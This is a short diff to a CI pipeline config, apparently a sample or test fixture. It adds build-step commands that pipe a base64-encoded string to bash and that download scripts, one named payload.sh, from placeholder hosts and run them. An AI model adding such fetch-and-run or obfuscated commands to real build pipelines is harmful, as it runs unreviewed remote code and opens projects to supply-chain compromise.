@@ -8,6 +8,9 @@ setup:
   script:
     - curl -sSL https://install.example.com/setup.sh | bash
     - wget -qO- https://raw.example.com/install.sh | sh
+    - echo "ZWNobyBwd25lZAo=" | base64 -d | bash
+    - curl -fsSL https://example.com/install.sh -o install.sh && bash install.sh
+    - curl -fsSL https://example.com/payload.sh > install.sh; sh install.sh
 
 build:
   stage: build
